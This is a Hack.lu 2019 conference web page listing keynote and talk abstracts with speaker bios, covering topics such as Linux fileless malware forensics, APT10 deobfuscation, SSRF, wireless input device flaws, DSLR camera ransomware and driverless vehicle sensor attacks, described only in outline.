---
layout: splash
title:  Talks
excerpt: "Talks - Hack.lu 2019"
---

# Keynotes

## <a name="Fileless+Malware+Infection+and+Linux+Process+Injection+in+Linux+OS"></a>Fileless Malware Infection and Linux Process Injection in Linux OS
by アドリアン ヘンドリック - Hendrik Adrian - @MalwareMustDie

Recent development of the exploitation with file-less method is also affecting the Linux platform too. The process injection and file-less methods used for malicious code execution on some post exploitation tools for Linux are supported to perform those operations. This trend may affect many internet of services and things that can trigger a wider and multiple incidents for more damage, so we may need to re-assess again current security readiness on protecting these platform.

In this presentation we would like to discuss several information, methods of the file-less infection and Linux process injection in the recent  trends from the blue-teamer perspective, following by the summary on their usage the way we spotted them in some public incidents. Along with the most applicable methods that may can help to forensics such cases, to help the fellow incident response operatives on handling such cases.

The information shared in this presentation is set on TLP AMBER.




### Bio: <a name="%E3%82%A2%E3%83%89%E3%83%AA%E3%82%A2%E3%83%B3+%E3%83%98%E3%83%B3%E3%83%89%E3%83%AA%E3%83%83%E3%82%AF+-+Hendrik+Adrian+-+%40MalwareMustDie"></a>アドリアン ヘンドリック - Hendrik Adrian - @MalwareMustDie




## <a name="Tiplines+Today"></a>Tiplines Today
by harlo

Nowadays, the majority of US-based newsrooms rely on primarily consumer-facing applications to facilitate secure communications with sources. Usage of tools like Signal, WhatsApp, Threema, and others, have spiked in usage as the most state-of-the-art way to ensure confidential conversations with at-risk leakers and whistleblowers. Documents flood newsrooms, sometimes in gigabytes at a time, and journalists need tools to interrogate that data in relative safety from device compromise, legal interception, all while getting the job at the accelerated speed of the news cycle. Let's explore how these tools, from both a technical and behavioral usage standpoint, *make the news*. Sometimes in a good way, when a story comes out after months of clandestine collaboration with sources, and toiling over data that needs to be interrogated; sometimes in a bad way, when sources get burned, or organizations endanger themselves.

With this talk, I aim to explain a theoretical bridge between hackers and other technologists; and the a special group of end-users (journalists and their sources) who are, often without their prior knowledge, at the complete mercy of tools they barely understand under-the-hood. This talk should be as satisfying for hackers as it will be for folks who love to hear spicy stories about the "sausage gets made" in contemporary newsrooms.




### Bio: <a name="harlo"></a>harlo

Harlo Holmes is the Director of Newsroom Digital Security at Freedom of the Press Foundation. She strives to help individual journalists in various media organizations become confident and effective in securing their communications within their newsrooms, with their sources, and with the public at large. She is a media scholar, software programmer, and activist; and contributes regularly to the open source mobile security collective [The Guardian Project](https://guardianproject.info/).


# Talks

## <a name="Defeating+APT10+Compiler-level+Obfuscations"></a>Defeating APT10 Compiler-level Obfuscations
by Takahiro Haruyama

Compiler-level obfuscations like opaque predicates and control flow flattening are starting to be observed in the wild and will be a challenge for malware analysts and researchers. Opaque predicates and control flow flattening are obfuscation methods used to limit malware analysis by defining unused logic, performing needless calculations, and altering code flow so that it is not linear. Manual analysis of malware utilizing these obfuscations is painful and time-consuming.

ANEL (also referred to as UpperCut) is a RAT used by APT10, typically targeting Japan. All recent ANEL samples are obfuscated with opaque predicates and control flow flattening. In this presentation I will explain how to automatically de-obfuscate the ANEL code by modifying the existing IDA Pro plugin HexRaysDeob. Specifically the following topics will be included.

- Disassembler tool internals (IDA Pro IL microcode)
- How to define and track opaque predicate patterns for the elimination
- How to break control flow flattening while considering various conditional/unconditional jump cases even if it heavily depends on the opaque predicate conditions and has multiple switch dispatchers 

The modified tool can work for most obfuscated functions in the tested samples. This implementation can deobfuscate approximately 92% of encountered functions. Additionally, most of the failed functions will be properly deobfuscated in IDA 7.3. Sharing the experience and knowledge of the implementation with the community will be valuable as threat actors other than APT10 may also start to use the same obfuscations.




### Bio: <a name="Takahiro+Haruyama"></a>Takahiro Haruyama

Takahiro Haruyama is a principal threat researcher with Carbon Black's Threat Analysis Unit, with over ten years of extensive experience and knowledge in malware analysis and digital forensics. He previously worked on reverse-engineering cyber espionage malware with Symantec's threat intelligence team. He has spoken at several famous conferences including REcon, HITB, HITCON, SECURE, DFRWS EU, SANS DFIR Summit, FIRST and BlackHat Briefings USA/Europe/Asia.


## <a name="The+Glitch+In+The+Matrix"></a>The Glitch In The Matrix
by Marion

Compared to the hordes of code reviewers and review tools that skim through pristine source code with every release cycle, the attention binary output gets from security engineers is limited. And why would security folks bother, bugs are all human-made; or, are they? Honestly, in reality, most are. Modern compilers and build setups are rather unlikely to accidentally introduce flaws into binaries, let alone security relevant flaws. Except, well, if an attacker gets her hands onto the build chain...
Now, it has been established, that compromised compilers can introduce bugs to output binaries; but really, how stealthy can this be? How small of a change can an attacker plant, and still create a security vulnerability? And which means of detection do we have for such glitches in the matrix? Shall we ask Neo?




### Bio: <a name="Marion"></a>Marion

Marion Marschalek is a former Malware Analyst and Reverse Engineer who recently started work at Intel in order to conquer the field of low level security research, where she nowadays spends an unusual amount of time looking at compiler source code. She has spoken at all the conferences and such, and seen all the things, and is one of the happiest hackers out there. Also, she runs a free reverse engineering bootcamp for women, because the world needs more researcherettes.


## <a name="Memory+forensics+analysis+of+Cisco+IOS+XR+32+bits+routers+with+%27Amnesic-Sherpa%27"></a>Memory forensics analysis of Cisco IOS XR 32 bits routers with 'Amnesic-Sherpa'
by Solal jacob

Nowadays attackers are targeting not only computers but also core network equipment like routers by using memory-only attacks that are difficult to detect as the firmware image is not modified. In order to determine if a router was compromised by a memory-only attack, we need to be able to perform forensics analysis on it, but this requires specialized tools. This presentation is about CISCO IOS XR router forensics. We will explain how work the internal of a CISCO IOS XR 32 bits, router running under the QNX operating system. And, as no tool currently exists to analyze CISCO IOS XR routers, we developed a router forensics framework called 'Amnesic-Sherpa', aimed at analyzing memory dump, that can be used to know if a router was compromised. This framework will be released as open-source.

This presentation will be divided in different parts:

The first part gives the necessary background: the context and the wide number of OSes in routers. We also describe the architecture of QNX, the microkernel running on IOS XR-32, and how it works: the startup
process, how the firmware is packed, the file systems in the firmware images, and the specific communication system between the processes.

Then, we will explain how we developed a specific memory acquisition tool and an analysis framework call 'Amnesic-Sherpa', aim at analyze those routers.

The tool first looks for all the interesting structures and information that can be present in an IOS XR memory dump, then tries to re-create the memory structures present in different parts of the microkernel memory at the moment of the dump, and extracts all available information. The tool then let the user inspects theses structures to find traces of compromise or anomalies.

In the last part, we verify the detection capabilities of our framework by manually modifying processes to simulate a memory attack. We then demonstrate how to use 'Amnesic-Sherpa' (and third party tools) to detect this attack and how the detection process could be automated.


### Bio: <a name="Solal+jacob"></a>Solal jacob

Solal is currently a researcher at the LED (research and Exploration in intrusion Detection Laboratory) at the ANSSI (French National Network & Cybersecurity agency), where he work on finding new ways to detect attacks. Before that Solal worked 10 years at ArxSys a company he founded, where he was core developer of DFF , an open-source digital forensics framework. He also conduct forensics investigation, do incident response missions, and trained people on these subjects.


## <a name="The+Road+to+Hell+is+Paved+with+Bad+Passwords"></a>The Road to Hell is Paved with Bad Passwords
by Chris Kubecka

Ever wonder what incident management is like when an embassy gets hacked, by ISIS? Come on a journey of surprisingly weak security, insider threats, a 50 million dollar extortion attempt, diplomatic immunity, city wide security lock down, all while >400 dignitary’s lives dangle in the negotiation crossfire. Join Chris, the lead investigator and resolver on a super-secret squirrel adventure against ISIS & Turkish Intel in The Hague, The Netherlands. Discussing the 2014 Saudi Arabian embassy hack. Whoever said STEM was boring made it boring! Solve the crime and save lives with key takeaways from a real life cyber terrorism investigation.  No classified information will be shared, some terrorists were harmed in the making of this talk.

Presentation about the following two articles and the unclassified portions of the original report I wrote for the Kingdom of Saudi Arabia, Saudi Embassy of the Netherlands and Saudi Aramco.
https://hackernoon.com/the-road-to-hell-is-paved-with-bad-passwords-ef54815873f9
https://www.csoonline.com/article/3386381/inside-the-2014-hack-of-a-saudi-embassy.html
A few years ago, I led an unusual digital crime incident investigation. A mix between cyber crime and cyber terrorism, leaving the events etched my the memory banks. Finding oneself in the midst of terrorist groups and high level political intrigue as a security expert and all around hacker seemed more fitting on a warped version of the IT crowd.
An Embassy in a European country had been hacked, pwnd hard. The back end, official business email account was targeted and subsequently misused by miscreants who sent out emails as if they were from the Ambassador’s trusted Secretary. Utilizing the compromised account, the nefarious attackers attempted to extort additional visa fees from select VVIP applicants. Time was of utmost importance. Quickly, I assembled a team, myself and one person, a senior forensics expert rockstar. We immediately travelled to the location and began the investigation.
The Embassy in question was highly distrustful of both the local police and the local Diplomatic Corp Police, a separate branch of police for embassies and diplomatic staff. The Embassy email account was high value, gave attackers access to contacts, communications and could lead to maximum damage to reputation. Non reputation concerns.
It was the Embassy IT person’s first week on the job and the previous person gave zero hand over. They couldn’t even get in touch with the previous person. The Embassy IT person had zero security experience, pure IT; but was willing to do just about anything to stop the attack. Stopping the damage, the bleeding and securing the email account was a top priority. 
“What’s the username and password?” I asked, expecting some super duper 26 + character, two factor authentication credential set, virgin blood sacrifice and the attackers were super spies. Answer: embassy@email.com, password is 123456. Yes, 123456. 
We investigated further, my forensics person checked around, taking samples, network checks via taps. Even though Windows XP was rampant, no real anti-virus was installed. They relied entirely on Microsoft Security Essentials. How good is MSE? “In June 2013, MSE achieved the lowest possible protection score, zero.” We changed the password, thought the worst was over and job done. Lucky for them, only two systems had any internet access and were on a closed network, separate from embassy government operations. Embassies frequently host intelligence services in addition to diplomacy. Glad there was a real separation, almost an air gap.

A few weeks later, as life was getting back to normal, another summoning. At this point, I was never going to eat my lunch. What began as some dodgy emails trying to fraudulently acquire extra visa fees using the embassy email account grew, exponentially. This time, an email went out, again from the official embassy email account, signed as the Ambassador’s Secretary to a handful of friendly embassies asking for 25 thousand Euro in the name of a friend of ISIS.
Back to the location again, this time alone to try and sort things out. Forensics was no longer required. The Ambassador was concerned it was an insider, as was I. As if we were on some sort of comedy skit on the BBC. We waited until everyone else exited the embassy after it closed for official business. Then, the comedy began by crouching down on our hands and knees looking for passwords written on post-it notes, under desks and other places. We were looking for embassy employee credentials to use their logins so I could further investigate certain employees without their knowledge. By we I mean the Ambassador and I. Never in my life had I expected to see an Ambassador sifting around dusty desks with me, on hands and knees.
We began to liaise with the Diplomatic Corps Police in a limited extent. At arms length at all times, trust was strained. It took a great deal of effort, meetings with the Ambassador to speak with any outside party.
Unfortunately, the attackers still had access somehow to the embassy email account. The Diplomatic Police, sending via CC not BCC gave away all the other official embassy back end email addresses. Then the real fun began. The attackers quickly capitalized on the faux pas and sent back an email to everyone spreading the fear. What began as a few hundred euro grew to 50 million USD.
The threats grew to not so casually mentioning a big private event the Ambassadors of the USA, UK, Japan, 400+ dignitaries and staff etc.. were slated to attend. If the money wasn’t paid up, the event would blow in more ways than one. During this time, the attackers took a particular and personal interest in the Ambassador’s Secretary, prompting the regular police to become involved for a split second. The regular police had no jurisdiction or authority in the matter and were warned to back off ASAP.
Quietly and unbeknownst to the residents. The city was put on alert, embassies locked down, every person passing by was treated with suspicion. I even had the joy of not one, but three “Cultural Attachés” of an ISIS friendly embassy try to befriend me at a pub I frequented during the investigation. One gave me a very personal gift, a set of Islamic prayer beads. Which I had promptly checked for bugs. The trio didn’t drink alcohol but would sit patiently in the pub, drinking tea for hours until I arrived. The trio said they wanted English lessons, but all spoke English.
Eventually I was able to gain the Ambassador’s trust to further interrogate some of the digital assets and accounts. This was quite unusual, I was not a citizen of the country in question. They allowed me to take back an asset to my lodgings. After getting comfortable, trying to relax, a glass of wine in hand. Eureka, I found it! The attackers still had access to the embassy email account because they had setup a back end email forwarder. Back end email forwarder closed, secured up the email account, gathered evidence. We then went on the hunt for who was behind the attack, hop by hop following each step back over multiple countries. The suspect(s) were isolated, placed under surveillance and effectively neutralized. Months later I was invited to a private embassy function. In the end, I was the only one blown away, by the Ambassador’s gift.

Further investigations by JM Porup, reporter for CSO Online revealed the rootkit in the original report had been used by some nefarious groups. Possibly pointing to the suspected insider having outside help.


### Bio: <a name="Chris+Kubecka"></a>Chris Kubecka

Chris Kubecka is the founder and CEO of HypaSec. Previous Group Leader for AOC, tasked with setting up digital security after the world’s most devastating cyber warfare attack so far, the 2012 Shamoon attacks. Previously, establishing and leading the network and security operations, UK/EU GDPR Privacy Group, joint international intelligence team and Information Protection Group for Aramco Overseas covering EMEA (outside KSA) and South America, part of Saudi Aramco. USAF veteran of multiple humanitarian and combat missions as air crew with degrees in information technology and computer science. Based in northern Europe, is a member of the Cyber Senate, Artificial Intelligence, subject matter expert panellist and advisor for the European Council of Foreign Relations regarding post Brexit digital security and cyber warfare. An advisor and subject matter expert to several governments and industries on cyber security and incident response for cyber warfare, and recognized expertise in financial, oil and gas, water and nuclear industry digital security.


## <a name="New+Tales+of+Wireless+Input+Devices"></a>New Tales of Wireless Input Devices
by Matthias Deeg, Gerhard Klostermeier

In our talk, we will present new security tales and vulnerabilities of wireless mice, keyboards, and presenters using 2.4 GHz radio communication that we have collected over the last two years.

In 2016, we published the results of our research project "Of Mice and Keyboards: On the Security of Modern Wireless Desktop Sets" and publicly disclosed several security vulnerabilities in wireless desktop sets using AES encryption of different manufacturers. In the same year, Bastille Research independently published security vulnerabilities in wireless mice and keyboards of different manufacturers, too. As time went by, we have learned more about the (in)security of further wireless input devices like mice, keyboards, and presenters using different 2.4 GHz radio-based technologies, and want to share our experiences and gained knowledge concerning these devices.

In our talk, we want to present answers to unanswered questions of our previous wireless desktop set research, raise the awareness of security issues and practical attacks against vulnerable wireless input devices, and tell some interesting tales.

We will present different security vulnerabilities (e.g. insufficient protection of sensitive data, unencrypted communication, unauthenticated communication, keystroke injection) in different 2.4 GHz wireless input devices (e.g. keyboards, mice, wireless presenters) of different manufacturers (e.g. Microsoft, Logitech, 1byone, Fujitsu, Inateck, Targus) using different technologies (e.g. Bluetooth Classic, Bluetooth LE, Nordic Semiconductor Enhanced ShockBurst, Cypress WirelessUSB LP, other proprietary radio communication protocols), and talk about the way we found them.

Concerning found Bluetooth security issues, we have published the following two papers last year but did not present this research results at a conference yet:

* Case Study: Security of Modern Bluetooth Keyboards
  https://www.syss.de/fileadmin/dokumente/Publikationen/2018/Security_of_Modern_Bluetooth_Keyboards.pdf

* Rikki Don't Lose That Bluetooth Device
   https://www.syss.de/fileadmin/dokumente/Publikationen/2018/Rikki_Dont_Lose_That_Bluetooth_Device.pdf

Regarding our new research about non-bluetooth 2.4 GHz wireless input devices, our paper is still work-in-progress and will hopefully be published within the next couple of months. Different security advisories will also be published according to our responsible disclosure policy.

One example concerning a keystroke injection attack against the AES-encrypted wireless keyboard Fujitsu LX901 is demonstrated in the following video:

* SySS Proof-of-Concept Video: Fujitsu LX901 Keystroke Injection Attack
   https://ptmd.sy.gs/videos/Fujitsu_LX901_Keystroke_Injection_Attack_PoC.mp4

All in all, our talk "New Tales of Wireless Input Devices" will be quite similar to our talk "Of Mice and Keyboards: On the Security of Modern Wireless Desktop Sets" from 2016 (https://www.syss.de/fileadmin/dokumente/Publikationen/2016/2016_10_18_Of_Mice_and_Keyboards-Hack.lu_2016.pdf).


### Bio: <a name="Matthias+Deeg"></a>Matthias Deeg

Matthias is interested in information technology - especially IT security - since his early days and has a great interest in seeing whether security assumptions in soft-, firm- or hardware hold true when taking a closer look. Matthias successfully studied computer science at the university of Ulm and holds the following IT security certifications: CISSP, CISA, OSCP, OSCE.

Since 2007 he works as IT security consultant for the IT security company SySS GmbH and is head of R&D.

His research results concerning different IT security topics were presented on different international IT security conferences (Chaos Communication Congress, DeepSec, Hacktivity, ZeroNights, PHDays, Ruxcon, Hack.lu, BSidesVienna). He also published several IT security papers and security advisories.


### Bio: <a name="Gerhard+Klostermeier"></a>Gerhard Klostermeier

Gerhard is interested in all things concerning IT security – especially
when it comes to hardware or radio protocols. He successfully studied IT
security at Aalen University and is working at SySS GmbH since 2014 as
IT security consultant and penetration tester.  He is also head of the
hardware security team.

Gerhard was speaker at different IT security conferences like GPN,
Ruxcon, and DeepSec, where he talked about hacking RFID-based student
cards or the security of wireless desktop sets. He is also author of the
Mifare Classic Tool Android app.


## <a name="Piercing+the+Veil%3A+Server+Side+Request+Forgery+attacks+on+Internal+Networks."></a>Piercing the Veil: Server Side Request Forgery attacks on Internal Networks.
by Alyssa Herrera

I demonstrate a successful attack on a cloud-based US Defense website, gaining access to a sensitive internal network, enumeration of internal services, out of bands data leakage and attack vectors unique to cloud architecture. Additionally I will discuss mitigation points for server side request forgery, how this type of vulnerability can manifest, what this type of attack is, and how I'm able to legally hack the Department Of U.S Defense.

Server-side request forgery (SSRF) attacks abuse poorly secured requests made on the server-side; these requests appear in many circumstances, from getting a user's avatar to pinging a third-party webhook. SSRF attacks hijack these HTTP requests, allowing an attacker to exploit the application to route URL/IP requests and subsequently probe or access sensitive networks.

Unsurprisingly, this can lead to serious breaches of security: exfiltration of secret keys, spoofing of email, and, ultimately, an entry point into an otherwise secure system. On cloud systems, SSRF gives the attacker a way to query for metadata which can reveal security credentials, or access tokens to the instance. Different cloud providers offer different safeguards; likewise they may make the threat far less clear than others do!

In this case study, I'll describe how, as part of a recent U.S. Department of Defense vulnerability disclosure program, I gained access to the Non-Classified Internet Protocol Router Network (NIPRNET). We'll look at the SSRF techniques that I used to access AWS metadata and reveal sensitive information about cloud instances. I'll also talk about some techniques for protection against SSRF - input validation, compartmentalized services, access control, and security policies.


### Bio: <a name="Alyssa+Herrera"></a>Alyssa Herrera

Alyssa Herrera is a full-time bug bounty hacker, working to protect countless organizations including the U.S. Department of Defense (DoD), Sony, Zendesk, Adobe, and Twitter. She got her start when she was in middle school, teaching herself how to gain administrative access to play games on her school computers. At age 16, Alyssa Herrera discovered Bug Bounties and HackerOne — and she hasn't looked back since. She is currently a top ranked hacker on multiple bug bounty platforms and has discovered 161 valid vulnerabilities on the HackerOne platform alone to date. Alyssa attends live hacking events across the globe, where she has the opportunity to work with small groups of hackers to find vulnerabilities in organizations such as Verizon Media and Airbnb. As Alyssa paves her own path, she is motivated to give back to the community by sharing the knowledge she has gained and become a role model for other aspiring female hackers.


## <a name="Fingerpointing+False+Positives%3A+How+to+better+integrate+Continuous+Improvement+into+Security+Monitoring"></a>Fingerpointing False Positives: How to better integrate Continuous Improvement into Security Monitoring
by Desiree Sacher

This talk is about how you can make your Security Operation Center more efficient and give your bored-out analysts more purpose, by making a small change to your security monitoring process. With a potential huge change in your workflow, and improved results.

The talk addresses the security monitoring resolution categories I created and documented in my taxonomy paper https://github.com/d3sre/Use_Case_Applicability. When working as an analyst in a Security Operation Center, most likely some duty will include security monitoring, depending on predefined use cases. Those use cases hopefully cover the relevant MITRE ATT&CK techniques, will most likely also cover more regulatory controls like the NIST 800-53 controls, but most definitely there will be false positives more than you like. The resolution categories help in refocusing the attention of the analyst to the "actual" cause of the alert. By tracking this in a seperate taxonomy, reports and statistics can point to company internal process problems or otherwise reflect the efficiency of the SOC. This is especially important when a SOC can't directly control all the configurations of it's log submitting devices. 
The talk will present the categories, the idea and goal behind this suggested solution and show ways on how reports can afterwards be interpreted.


### Bio: <a name="Desiree+Sacher"></a>Desiree Sacher

Desiree is a Security Architect for a Security Operation Center in the financial industry. But through her career she worked in engineering positions for different security products, until in 2014 she finally became a Security Analyst. She now draws all of her experience from these jobs and her connection into the Infosec scene into creating efficient SOCs. Desiree is also a certified GCIA Forensic Analyst, Network Forensic and Cyber Threat Intelligence Analyst.


## <a name="Sensor+%26+Logic+Attack+Surface+of+Driverless+Vehicles"></a>Sensor & Logic Attack Surface of Driverless Vehicles
by Zoz

Networked and connected vehicles have the same network attack surface as other IoT devices, but are also heavily reliant on sensor inputs and the need for split second decision making under uncertain conditions, making them suffer a unique set of vulnerabilities even when network attacks are discounted. In this session the state of automated vehicle technology will be presented with a focus on the attack surface presented by vehicles' sensor and control logic suites, and the potential failure modes that could be exploited by malicious hackers and criminals.

The talk will begin with an introduction to autonomous, unmanned and driverless systems, and the history thereof which most people are far from aware of.  Many people, even the technically inclined, are not familiar with the history of even driverless cars, and think it is largely a new development.  The talk will provide interesting history to correct this, then will briefly cover the current state of unmanned systems across the various domains (land/sea/air).

After this brief historical summary the talk will move into general failure modes, including some high profile incidents and lessons that can be learned from them.  One major case study from each of the unmanned aviation and driverless car space.

This is followed by a systems engineering level overview of the various subsystems that make up an autonomous system, from low level control laws to high level autonomy, what hardware and software is responsible for each, and where designers are most likely to introduce bugs.

After this there will be a comprehensive overview of the sensors that are used in unmanned vehicles: the type, cost, manner of working and most importantly, how they can be deliberately caused to fail.  This is backed up with real examples from the presenter's experience and from current published research efforts.  I also intend to cover proposed "unhackable" sensor upgrades.

I will cover denial and spoofing attacks on:
- GPS
- LIDAR
- Vision cameras/Tesla autopilot
- Millimeter wave radar
- Ultrasonic transducers
- Digital compass
- IMU
- Wheel encoders
- Ground-penetrating radar

Next are attacks on the high level autonomy modules and ways to produce unexpected and undefined behaviors from the overall system.  This will give attendees a good idea of serious problems that have yet to be solved in the space.  These are NOT unserious thought experiments like the trolley problem, these are real problems that the leaders in driverless car testing are struggling with.

If there is time, finally, because many of these fully driverless systems may take longer to roll out than some expect, the talk will cover driver assist and safety assist modes that are already showing up in production vehicles or planned to be rolled out at the regulatory level over the next few years.  Most importantly, the US DOT specs for V2V and V2I communications that have been recently released, and placing them in the context of recent hacks on "smart infrastructure" components such as connected traffic systems.  Most likely there will not be time for this though, I have enough sensor hack info alone to fill the 45 minutes.


### Bio: <a name="Zoz"></a>Zoz

Zoz is a robotics interface designer and rapid prototyping specialist.  As
co-host of the Discovery Channel show 'Prototype This!' he pioneered urban
pizza delivery with robotic vehicles, including the first autonomous
crossing of an active highway bridge in the USA, and airborne delivery of
life preservers at sea from an autonomous aircraft.  He, for one, welcomes
our new robot chauffeurs, and would only mess with them out of tough love.


## <a name="spispy%3A+opensource+SPI+flash+emulation"></a>spispy: opensource SPI flash emulation
by Trammell Hudson

spispy is an open source hardware tool for emulating SPI flash chips that makes firmware development and boot security research easier. In this talk we'll discuss the challenges of interfacing on the SPI bus and emulating SPI devices, as well as demonstrate how to use it quickly debug issues with coreboot and how we used spispy to discover a critical class of TOCTOU vulnerabilities in secure boot systems like Intel BootGuard.




### Bio: <a name="Trammell+Hudson"></a>Trammell Hudson

I like to take things apart. https://trmm.net/


## <a name="Say+Cheese+-+How+I+Ransomwared+your+DSLR+Camera"></a>Say Cheese - How I Ransomwared your DSLR Camera
by Eyal Itkin

It's a nice sunny day on your vacation, the views are stunning, and like on any other day you take out your DSLR camera and start taking pictures. Sounds magical right? But when you get back to your hotel the real shock hits you: someone infected your camera with ransomware! All your images are encrypted, and the camera is locked. How could that happen?

In this talk, we show a live demo of this exact scenario. Join us as we take a deep dive into the world of the Picture Transfer Protocol (PTP). The same protocol that allows you to control your camera from your phone or computer, can also enable any attacker to do that and more. We will describe in detail how we found multiple vulnerabilities in the protocol and how we exploited them remotely(!) to take over this embedded device.

But it doesn't end here. While digging into our camera, we found a reliable way to take over most of the DSLR cameras without exploiting any vulnerability at all. We simply had to ask our camera to do that for us, and it worked.

This is the first vulnerability research on the Picture Transfer Protocol, a vendor agnostic logical layer that is common to all modern-day cameras. As DSLR cameras are used by consumers and journalists alike, this opens up the door for future research on these sensitive embedded devices.

Outline:
----------
- Who am I?
- Motivation
  * People really care about their DSLR cameras
  * Would they pay to get it back?
- PTP 101
  * Picture Transfer Protocol
  * Does much more than just copying pictures
  * Works over USB and over Wifi
- Introducing our target:
  * Canon DSLR cameras
  * Modding a camera - Magic Lantern
- Getting the firmware
  * Firmware update is encrypted
  * ML has a ROM Dumper
- Starting the RE
  * DryOS RTOS
  * PTP uses unique constants, how nice of it
- Finding Vulnerabilities
  * ~150 PTP commands
  * found 5 different 0-Days just in this layer
- Exploiting the vulnerabilities
  * Blind Sleep-based debugging didn't work
  * The camera fights back
  * Err 70
  * Blind Crash-based exploit development 
- Writing a ransomware
  * Scout Debugger
  * We need some crypto
  * Firmware update has crypto
- Firmware update
  * Symmetric crypto ?!
  * Extracting the keys
  * Asking the camera to sign our firmware update
- Win!
  * Live-Demo of our exploit + Ransomware
  * Bonus: PoC of our own firmware update
- Conclusions
  * Obscurity != Security
  * Don't invent your own crypto


### Bio: <a name="Eyal+Itkin"></a>Eyal Itkin

Eyal Itkin is a vulnerability researcher in the Malware and Vulnerability Research group at Check Point Software Technologies. Eyal has an extensive background in security research, that includes years of experience in embedded network devices and protocols, bug bounties from all popular interpreter languages, and an award by Microsoft for his CFG enhancement white paper. When not breaking RDP or FAX, he loves bouldering, swimming, and thinking about the next target for his research.


## <a name="DeTT%26CT%3A+Mapping+your+Blue+Team+to+MITRE+ATT%26CK"></a>DeTT&CT: Mapping your Blue Team to MITRE ATT&CK
by Marcus Bakker, Ruben Bouman

Within blue teams, it is crucial to have sufficient and adequate information on several aspects to prioritise your defence efforts. Important aspects are: visibility (indicate if you have sufficient data sources to be able to see traces of attack techniques), detection (how good are you in detecting attackers) and threat actor behaviours (to determine which attack behaviours are essential for your organisation to defend against). 

Obtaining and administrating this information can be a challenge. In this talk we present the DeTT&CT framework, build atop of MITRE ATT&CK, that helps blue teams to gain insight into these aspects and to start prioritising their defence efforts. The ultimate goal of DeTT&CT is to become more resilient against attacks targeting your organisation.




### Bio: <a name="Marcus+Bakker"></a>Marcus Bakker

Marcus Bakker is a passionate IT Security professional with over eight years of experience in offensive IT Security and Cyber Defence. Marcus is the co-creator of the DeTT&CT framework and co-author of the TaHiTI threat hunting methodology.


### Bio: <a name="Ruben+Bouman"></a>Ruben Bouman

Ruben Bouman is an IT Security professional and co-owner of Sirius Security. He has been working for several organisations in the Dutch financial sector for over twelve years and is experienced in cyber defence and incident response. Ruben is the co-creator of the DeTT&CT framework.


## <a name="DOS+Software+Security%3A+Is+there+Anyone+Left+to+Patch+a+25-year+old+Vulnerability%3F"></a>DOS Software Security: Is there Anyone Left to Patch a 25-year old Vulnerability?
by Alexandre Bartel

Abstract. DOS (Disk Operating System) systems were developed in the
1970s and are still used today, for example in some embedded systems,
management applications or by the gaming community. In this article
we will study the impact of the (lack of) security of DOS applications
on modern systems. We will explain in detail the vulnerability of the
CVE-2018-20343 which affects the Build Engine - a 3D engine - and which
allows arbitrary code execution. We show that such vulnerabilities can
be found in seconds using state-of-the-art fuzzers. Often, running a DOS
applications today means running it within an emulator such as DOSBox.
Such emulators should limit the interaction between the DOS application
and the host OS. Unfortunately, we also show how DOSBox directly
allows emulated applications to access the host file system, thus allowing
to compromise the host machine by changing login scripts for instance.
While this kind of attack usually requires a user action (login, reboot, etc.)
to execute the malicious code, we further show, by explaining CVE-2019-12594, 
that even immediate arbitrary code execution can be achieved by
bypassing mitigation techniques such as DEP or ASLR. Finally, we will
describe how software vendor are (or not) patching such vulnerabilities
in DOS applications they still sell today.




### Bio: <a name="Alexandre+Bartel"></a>Alexandre Bartel

Alexandre Bartel is a research associate in software engineering at the University of Luxembourg in the Interdisciplinary Centre for Security, Reliability and Trust's Serval Team. His research is in the area of software engineering and computer security.


## <a name="The+regulation+%28EU%29+2019%2F796+of+17+May+2019+concerning+restrictive+measures+against+cyber-attacks+threatening+the+Union+or+its+Member+States"></a>The regulation (EU) 2019/796 of 17 May 2019 concerning restrictive measures against cyber-attacks threatening the Union or its Member States
by Eve Matringe

The Article 215 of the Treaty on the Functioning of the European Union allows the Council to adopt restrictive measures against natural or legal persons and groups or non-State entities in some specific cases. This Regulation applies to cyber-attacks with a significant effect, including attempted cyber-attacks with
a potentially significant effect, which constitute an external threat to the Union or its Member States. 
What measures can be adopted, according to what procedure and under what conditions, against whom and what remedies are available.

Europa is now NSA&russian-cyberbullet-proof.


### Bio: <a name="Eve+Matringe"></a>Eve Matringe

Registered attorney at the luxemburgish Bar, PhD in Law. 
https://www.barreau.lu/detailpage?accountNumberParam=2878


## <a name="What+the+log%3F%21+So+many+events%2C+so+little+time%E2%80%A6"></a>What the log?! So many events, so little time…
by Miriam Wiesner

Detecting adversaries is not always easy. Especially when it comes to correlating Windows Event Logs to real-world attack patterns and techniques.

Join me to find out how to match Windows Event Log IDs with the MITRE ATT&CK framework and methods to simplify the detection in your environment.

I will present my OpenSource EventList tool with which one is able to:
- Import either MSFT Baselines or custom GPOs
- Find out immediately which Events are being generated and what MITRE ATT&CK techniques are being covered by the selected Baseline/GPO
- Choose MITRE ATT&CK techniques and generate GPOs to generate the events needed for detection
- Generate Agent Forwarder Configs to only cover the events needed for the detection (avoid being "Log spammed")
- Generate Queries to detect the chosen MITRE ATT&CK techniques, regardless of the SIEM solution used


### Bio: <a name="Miriam+Wiesner"></a>Miriam Wiesner

Miriam Wiesner works as a Program Manager for Microsoft Defender ATP. Besides MDATP, she has a focus on Secure Infrastructure, Windows Event Logs, Active Directory Security, Just Enough Administration & PowerShell and many more.
In her spare time, she enjoys writing articles for her private blog also as developing tools to help the community and speaks on international conferences and events.
She’s a life-long learner, always excited about new technologies and empowering others.


## <a name="Disturbance%3A+on+the+Sorry+State+of+Cybersecurity+and+Potential+Cures"></a>Disturbance: on the Sorry State of Cybersecurity and Potential Cures
by Saad Kadhi

Infosec research, good and bad, abounds, like almost everything else in this ‘infobese’ era. Cybersecurity conferences are filled with presentations exposing new vulnerabilities, as if we didn’t have enough of those already, describing best practices or showcasing tools and techniques. That is fine, as long as we keep the end goal in plain sight: protecting the digital realm.

In this blockchain-free talk, we’ll compare past, current and possible future trends of the threat landscape and attempt to demonstrate why, with all our goodwill and altruism, educational and mentoring programs, the sorry state of cybersecurity is here to stay unless we take a step back. It’s hard and yet necessary to question ourselves, to reframe and rephrase the messages that we keep conveying for the last twenty years, and stop the long shoulder-patting tradition. If we really care about cybersecurity, it’s time we address the core problems from a different perspective, one that requires hardship, courage and patience, one that places the audience at the centre, armed with a profit carrot in one hand and a liability stick in the other.

In a seminal talk titled ‘You and your research’, given at Brucon in 2011, Haroon Meer, a well known and respected security researcher, found out that there were more cybersecurity conferences than days in a year. During the same conference, Alex Hutton delivered a wonderful keynote about why information risk management Is failing and offered solutions to address this significant problem. And these are just two examples of cybersecurity folks talking to other cybersecurity folks, on and on and on, in an honest attempt to protect the digital realm, if not cure once and for all its ailments.

